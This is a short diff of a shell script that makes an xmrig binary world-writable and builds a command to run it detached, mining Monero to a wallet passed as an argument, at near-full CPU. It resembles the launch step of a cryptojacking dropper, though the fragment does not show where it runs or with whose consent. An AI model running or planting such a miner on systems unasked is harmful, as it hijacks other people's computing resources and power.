@@ -6,5 +6,4 @@ done
 chmod 777 ./xmrig_0c
 qianbao=$1
 CMD="setsid ./xmrig_0c --coin=monero -o pool.minexmr.com:4444 -u $qianbao --randomx-mode=fast --cpu-max-threads-hint 99 --threads=8"
-done
 exit 0
